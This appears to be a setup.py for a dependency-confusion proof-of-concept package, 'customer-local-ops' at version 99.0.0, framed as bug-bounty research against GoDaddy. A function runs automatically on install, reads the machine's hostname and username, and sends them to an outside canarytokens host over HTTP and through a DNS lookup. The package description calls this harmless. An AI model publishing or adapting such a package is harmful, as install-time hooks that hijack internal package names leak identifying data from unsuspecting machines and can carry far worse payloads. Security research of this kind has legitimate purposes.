import setuptools
import os, socket, subprocess, sys

def _callback():
    """Harmless DNS + HTTP ping to prove installation occurred."""
    import urllib.request, platform
    host = socket.getfqdn()
    user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    tag = "customer-local-ops--" + host + "--" + user
    url = "http://canarytokens.com/about/terms/tags/2gr6sniv0mwcs6k21bl65gchf/payments.js" + ("&" if "?" in "http://canarytokens.com/about/terms/tags/2gr6sniv0mwcs6k21bl65gchf/payments.js" else "?") + "pkg=" + tag
    try:
        urllib.request.urlopen(url, timeout=5)
    except Exception:
        pass
    # Also do a DNS lookup so we get a second signal even if HTTP is blocked
    try:
        socket.getaddrinfo(tag.replace(" ","_")[:60] + ".dns.canary.tools", 80)
    except Exception:
        pass

_callback()

setuptools.setup(
    name="customer-local-ops",
    version="99.0.0",
    author="GoDaddy Security Research",
    author_email="security@godaddy.com",
    description="Security research — dependency-confusion PoC for GoDaddy bug bounty (harmless callback only)",
    long_description="This package exists solely to demonstrate a dependency-confusion vulnerability in GoDaddy internal infrastructure. It contains no malicious code — only a single HTTP/DNS callback to prove installation occurred. Contact: security@godaddy.com",
    long_description_content_type="text/plain",
    packages=["customer_local_ops"],
    python_requires=">=3.6",
    classifiers=[
        "Development Status :: 1 - Planning",
        "License :: Other/Proprietary License",
    ],
)
